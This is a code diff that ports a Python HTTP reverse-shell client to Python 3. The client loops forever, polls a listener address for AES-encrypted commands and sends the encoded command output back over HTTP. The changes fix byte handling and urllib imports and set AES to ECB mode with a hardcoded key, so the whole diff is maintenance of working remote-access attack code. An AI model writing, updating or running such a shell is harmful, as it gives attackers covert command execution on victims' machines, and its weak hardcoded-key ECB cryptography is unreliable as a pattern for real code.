@@ -36,7 +36,7 @@
 ##########################################################################
 
 
-import urllib
+from urllib import parse, request
 from Crypto.Cipher import AES
 import sys
 import os
@@ -51,21 +51,33 @@ BLOCK_SIZE = 32
 # the character used for padding--with a block cipher such as AES, the value
 # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
 # used to ensure that your value is always a multiple of BLOCK_SIZE
-PADDING = '{'
-# one-liner to sufficiently pad the text to be encrypted
-pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
+PADDING = b'{'
 
-# one-liners to encrypt/encode and decrypt/decode a string
-# encrypt with AES, encode with base64
-EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
-DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
+
+def _to_bytes(value):
+    if isinstance(value, bytes):
+        return value
+    return str(value).encode("utf-8")
+
+
+def pad(value):
+    raw_value = _to_bytes(value)
+    return raw_value + (BLOCK_SIZE - len(raw_value) % BLOCK_SIZE) * PADDING
+
+
+def EncodeAES(cipher_obj, value):
+    return base64.b64encode(cipher_obj.encrypt(pad(value)))
+
+
+def DecodeAES(cipher_obj, value):
+    return cipher_obj.decrypt(base64.b64decode(value)).rstrip(PADDING).decode("utf-8", "replace")
 
 # secret key, change this if you want to be unique
-secret = "(3j^%sh@hd3hDH2u3h@*!~h~2&^lk<!L"
+secret = b"(3j^%sh@hd3hDH2u3h@*!~h~2&^lk<!L"
 # random junk
 random = "sdfdsfdsdfsfd@#2$"
 # create a cipher object using the random secret
-cipher = AES.new(secret)
+cipher = AES.new(secret, AES.MODE_ECB)
 
 # TURN THIS ON IF YOU WANT PROXY SUPPORT
 PROXY_SUPPORT = "OFF"
@@ -78,11 +90,11 @@ PASSWORD = "password_here"
 
 # here is where we set all of our proxy settings
 if PROXY_SUPPORT == "ON":
-    auth_handler = urllib.request.HTTPBasicAuthHandler()
+    auth_handler = request.HTTPBasicAuthHandler()
     auth_handler.add_password(realm='RESTRICTED ACCESS', uri=PROXY_URL,
                               user=USERNAME, passwd=PASSWORD)
-    opener = urllib.request.build_opener(auth_handler)
-    urllib.request.install_opener(opener)
+    opener = request.build_opener(auth_handler)
+    request.install_opener(opener)
 
 try:
     # our reverse listener ip address
@@ -102,9 +114,9 @@ except IndexError:
 # loop forever
 while 1:
     # open up our request handelr
-    req = urllib.request.Request('http://%s:%s' % (address, port))
+    req = request.Request('http://%s:%s' % (address, port))
     # grab our response which contains what command we want
-    message = urllib.request.urlopen(req)
+    message = request.urlopen(req)
     # base64 unencode
     message = base64.b64decode(message.read())
     # decrypt the communications
@@ -123,7 +135,7 @@ while 1:
     # base64 encode the data
     data = base64.b64encode(data)
     # urlencode the data from stdout
-    data = urllib.parse.urlencode({'cmd': '%s'}) % (data)
+    data = parse.urlencode({'cmd': data.decode("ascii")})
     # who we want to connect back to with the shell
     h = http.client.HTTPConnection('%s:%s' % (address, port))
     # set our basic headers
